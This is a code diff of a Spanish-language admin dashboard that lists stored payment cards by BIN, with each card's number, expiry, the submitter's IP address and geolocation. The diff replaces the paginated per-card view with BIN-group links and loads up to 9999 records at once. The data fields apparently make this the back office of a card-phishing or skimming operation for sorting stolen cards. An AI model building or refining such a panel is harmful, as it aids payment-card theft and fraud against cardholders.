@@ -490,163 +490,22 @@
             margin-top: 0.2rem;
         }
 
-        .bin-group-chevron {
-            font-size: 0.85rem;
+        .bin-group-arrow {
+            font-size: 0.9rem;
             color: var(--text-muted);
             transition: transform 0.3s ease;
             flex-shrink: 0;
         }
 
-        .bin-group.open .bin-group-chevron {
-            transform: rotate(180deg);
+        .bin-group:hover .bin-group-arrow {
+            color: var(--accent-light);
+            transform: translateX(4px);
         }
 
-        .bin-group-body {
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.4s ease;
-        }
-
-        .bin-group.open .bin-group-body {
-            max-height: 3000px;
-        }
-
-        .bin-group-cards {
-            padding: 0 1rem 1rem;
-            display: flex;
-            flex-direction: column;
-            gap: 0.6rem;
-        }
-
-        .bin-group-divider {
-            height: 1px;
-            background: rgba(155, 124, 197, 0.12);
-            margin: 0 1.5rem;
-        }
-
-        /* INDIVIDUAL CARD INSIDE GROUP */
-        .card-item {
-            background: var(--bg-tertiary);
-            border: var(--border-subtle);
-            border-radius: 12px;
-            padding: 0.9rem 1.1rem;
-            display: grid;
-            grid-template-columns: 1fr 80px 140px 1fr auto auto;
-            align-items: center;
-            gap: 1rem;
-            transition: all var(--transition-base);
-        }
-
-        .card-item:hover {
-            background: var(--bg-surface-hover);
-            border-color: rgba(155, 124, 197, 0.3);
-        }
-
-        .card-num {
-            font-family: 'Inter', monospace;
-            font-weight: 600;
-            color: var(--text-primary);
-            letter-spacing: 0.05em;
-            font-size: 0.9rem;
-        }
-
-        .card-expiry {
-            font-size: 0.85rem;
-            color: var(--text-secondary);
-            font-family: monospace;
-        }
-
-        .ip-cell {
-            font-family: monospace;
-            font-size: 0.82rem;
-            color: var(--text-secondary);
-        }
-
-        .ip-location {
-            font-size: 0.78rem;
-            color: var(--text-muted);
-        }
-
-        .date-cell {
-            font-size: 0.82rem;
-            white-space: nowrap;
-            color: var(--text-muted);
-        }
-
-        .delete-btn {
-            padding: 0.4rem 0.7rem;
-            background: rgba(199, 90, 90, 0.15);
-            border: 1px solid rgba(199, 90, 90, 0.3);
-            border-radius: 8px;
-            color: var(--error);
-            font-size: 0.8rem;
-            cursor: pointer;
-            transition: all var(--transition-base);
-            display: inline-flex;
-            align-items: center;
-            gap: 0.4rem;
-            white-space: nowrap;
-        }
-
-        .delete-btn:hover {
-            background: var(--error);
-            border-color: var(--error);
-            color: var(--white);
-            transform: translateY(-1px);
-        }
-
-        .delete-btn:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        /* PAGINATION */
-        .pagination {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 1.25rem 0 0;
-            flex-wrap: wrap;
-            gap: 0.75rem;
-        }
-
-        .pagination-info {
-            font-size: 0.85rem;
-            color: var(--text-muted);
-        }
-
-        .pagination-controls {
-            display: flex;
-            gap: 0.5rem;
-        }
-
-        .page-btn {
-            padding: 0.5rem 0.9rem;
-            background: var(--bg-tertiary);
-            border: var(--border-subtle);
-            border-radius: 8px;
-            color: var(--text-secondary);
-            font-size: 0.85rem;
-            cursor: pointer;
-            transition: all var(--transition-base);
-        }
-
-        .page-btn:hover:not(:disabled) {
-            background: var(--primary);
-            border-color: var(--primary);
-            color: var(--white);
-        }
-
-        .page-btn.active {
-            background: var(--primary);
-            border-color: var(--primary);
-            color: var(--white);
-        }
-
-        .page-btn:disabled {
-            opacity: 0.4;
-            cursor: not-allowed;
+        .bin-group-link {
+            text-decoration: none;
+            color: inherit;
+            display: block;
         }
 
         /* LOADING & EMPTY */
@@ -722,11 +581,6 @@
 
             .stats-row {
                 grid-template-columns: repeat(2, 1fr);
-            }
-
-            .card-item {
-                grid-template-columns: 1fr;
-                gap: 0.5rem;
             }
         }
 
@@ -810,14 +664,6 @@
                 <div class="label">BINs Únicos</div>
                 <div class="value" id="stat-bins">—</div>
             </div>
-            <div class="stat-card">
-                <div class="label">Página Actual</div>
-                <div class="value" id="stat-page">—</div>
-            </div>
-            <div class="stat-card">
-                <div class="label">Total Páginas</div>
-                <div class="value" id="stat-pages">—</div>
-            </div>
         </div>
 
         <div id="cards-container">
@@ -826,15 +672,10 @@
                 Cargando datos...
             </div>
         </div>
-        <div class="pagination" id="pagination">
-            <div class="pagination-info" id="pagination-info">Mostrando 0 de 0</div>
-            <div class="pagination-controls" id="pagination-controls"></div>
-        </div>
     </div>
 
     <script>
         let authToken = null;
-        let currentPage = 1;
         let searchTimeout = null;
 
         // Check for stored token
@@ -895,7 +736,6 @@
         document.getElementById('search-input').addEventListener('input', function () {
             clearTimeout(searchTimeout);
             searchTimeout = setTimeout(() => {
-                currentPage = 1;
                 loadCards();
             }, 400);
         });
@@ -911,7 +751,7 @@
             container.innerHTML = '<div class="loading-state"><div class="loading-spinner"></div>Cargando datos...</div>';
 
             const search = document.getElementById('search-input').value;
-            const params = new URLSearchParams({ page: currentPage, limit: 100, search });
+            const params = new URLSearchParams({ page: 1, limit: 9999, search });
 
             try {
                 const res = await fetch(`/api/admin-cards?${params}`, {
@@ -945,12 +785,10 @@
                 const binKeys = Object.keys(binGroups).sort();
 
                 // Update stats
-                document.getElementById('stat-total').textContent = data.pagination.total;
+                document.getElementById('stat-total').textContent = data.data.length;
                 document.getElementById('stat-bins').textContent = binKeys.length;
-                document.getElementById('stat-page').textContent = data.pagination.page;
-                document.getElementById('stat-pages').textContent = data.pagination.totalPages;
 
-                // Render BIN groups
+                // Render BIN groups as clickable links
                 if (data.data.length === 0) {
                     container.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No se encontraron tarjetas</p></div>';
                 } else {
@@ -965,147 +803,29 @@
                             hour: '2-digit', minute: '2-digit'
                         });
 
-                        const cardsHtml = cards.map(card => {
-                            const cardNum = card.card_number || '—';
-                            const formatted = cardNum.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
-                            const expiry = card.expiry || '—';
-                            const ip = card.ip_address || '—';
-
-                            let location = '—';
-                            if (card.ip_info) {
-                                const info = typeof card.ip_info === 'string' ? JSON.parse(card.ip_info) : card.ip_info;
-                                const parts = [];
-                                if (info.city) parts.push(info.city);
-                                if (info.region) parts.push(info.region);
-                                if (info.country) parts.push(info.country);
-                                if (parts.length) location = parts.join(', ');
-                            }
-
-                            const date = card.created_at ? new Date(card.created_at).toLocaleString('es-ES', {
-                                day: '2-digit', month: '2-digit', year: 'numeric',
-                                hour: '2-digit', minute: '2-digit'
-                            }) : '—';
-
-                            return `<div class="card-item" id="row-${card.id}">
-                                <span class="card-num">${formatted}</span>
-                                <span class="card-expiry">${expiry}</span>
-                                <span class="ip-cell">${ip}</span>
-                                <span class="ip-location">${location}</span>
-                                <span class="date-cell">${date}</span>
-                                <button class="delete-btn" onclick="deleteCard(${card.id}, this)"><i class="fas fa-trash-alt"></i> Eliminar</button>
-                            </div>`;
-                        }).join('');
-
-                        return `<div class="bin-group" data-bin="${bin}">
-                            <div class="bin-group-header" onclick="toggleBinGroup(this)">
-                                <div class="bin-group-header-left">
-                                    <div class="bin-group-icon"><i class="fas fa-credit-card"></i></div>
-                                    <div class="bin-group-info">
-                                        <div class="bin-group-title">
-                                            <span class="bin-label">${bin}</span>
-                                            <span class="bin-group-badge"><i class="fas fa-layer-group"></i> ${cards.length} tarjeta${cards.length > 1 ? 's' : ''}</span>
+                        return `<a href="/admin/bin/${bin}.html" class="bin-group-link">
+                            <div class="bin-group" data-bin="${bin}">
+                                <div class="bin-group-header">
+                                    <div class="bin-group-header-left">
+                                        <div class="bin-group-icon"><i class="fas fa-credit-card"></i></div>
+                                        <div class="bin-group-info">
+                                            <div class="bin-group-title">
+                                                <span class="bin-label">${bin}</span>
+                                                <span class="bin-group-badge"><i class="fas fa-layer-group"></i> ${cards.length} tarjeta${cards.length > 1 ? 's' : ''}</span>
+                                            </div>
+                                            <div class="bin-group-meta">Última: ${latestStr}</div>
                                         </div>
-                                        <div class="bin-group-meta">Última: ${latestStr}</div>
                                     </div>
+                                    <i class="fas fa-chevron-right bin-group-arrow"></i>
                                 </div>
-                                <i class="fas fa-chevron-down bin-group-chevron"></i>
                             </div>
-                            <div class="bin-group-body">
-                                <div class="bin-group-divider"></div>
-                                <div class="bin-group-cards">${cardsHtml}</div>
-                            </div>
-                        </div>`;
+                        </a>`;
                     }).join('') + '</div>';
                 }
-
-                // Pagination
-                renderPagination(data.pagination);
 
             } catch (err) {
                 console.error('Load error:', err);
                 container.innerHTML = '<div class="empty-state"><i class="fas fa-wifi"></i><p>Error de conexión</p></div>';
-            }
-        }
-
-        function toggleBinGroup(header) {
-            const group = header.closest('.bin-group');
-            group.classList.toggle('open');
-        }
-
-        function renderPagination(pg) {
-            const info = document.getElementById('pagination-info');
-            const start = (pg.page - 1) * pg.limit + 1;
-            const end = Math.min(pg.page * pg.limit, pg.total);
-            info.textContent = pg.total > 0
-                ? `Mostrando ${start}-${end} de ${pg.total}`
-                : 'Sin resultados';
-
-            const controls = document.getElementById('pagination-controls');
-            controls.innerHTML = '';
-
-            if (pg.totalPages <= 1) return;
-
-            // Prev
-            const prev = document.createElement('button');
-            prev.className = 'page-btn';
-            prev.innerHTML = '<i class="fas fa-chevron-left"></i>';
-            prev.disabled = pg.page <= 1;
-            prev.addEventListener('click', () => { currentPage--; loadCards(); });
-            controls.appendChild(prev);
-
-            // Page numbers
-            const maxVisible = 5;
-            let startPage = Math.max(1, pg.page - Math.floor(maxVisible / 2));
-            let endPage = Math.min(pg.totalPages, startPage + maxVisible - 1);
-            if (endPage - startPage < maxVisible - 1) startPage = Math.max(1, endPage - maxVisible + 1);
-
-            for (let p = startPage; p <= endPage; p++) {
-                const btn = document.createElement('button');
-                btn.className = 'page-btn' + (p === pg.page ? ' active' : '');
-                btn.textContent = p;
-                btn.addEventListener('click', () => { currentPage = p; loadCards(); });
-                controls.appendChild(btn);
-            }
-
-            // Next
-            const next = document.createElement('button');
-            next.className = 'page-btn';
-            next.innerHTML = '<i class="fas fa-chevron-right"></i>';
-            next.disabled = pg.page >= pg.totalPages;
-            next.addEventListener('click', () => { currentPage++; loadCards(); });
-            controls.appendChild(next);
-        }
-
-        async function deleteCard(id, btn) {
-            if (!confirm('¿Estás seguro de que deseas eliminar esta tarjeta?')) return;
-
-            btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
-
-            try {
-                const res = await fetch(`/api/admin-delete-card?id=${id}`, {
-                    method: 'DELETE',
-                    headers: { 'Authorization': `Bearer ${authToken}` }
-                });
-
-                if (res.ok) {
-                    const row = document.getElementById(`row-${id}`);
-                    if (row) {
-                        row.style.transition = 'opacity 0.3s ease';
-                        row.style.opacity = '0';
-                        setTimeout(() => { row.remove(); }, 300);
-                    }
-                    // Reload to update stats
-                    setTimeout(() => loadCards(), 400);
-                } else {
-                    alert('Error al eliminar la tarjeta');
-                    btn.disabled = false;
-                    btn.innerHTML = '<i class="fas fa-trash-alt"></i> Eliminar';
-                }
-            } catch (err) {
-                alert('Error de conexión');
-                btn.disabled = false;
-                btn.innerHTML = '<i class="fas fa-trash-alt"></i> Eliminar';
             }
         }
     </script>
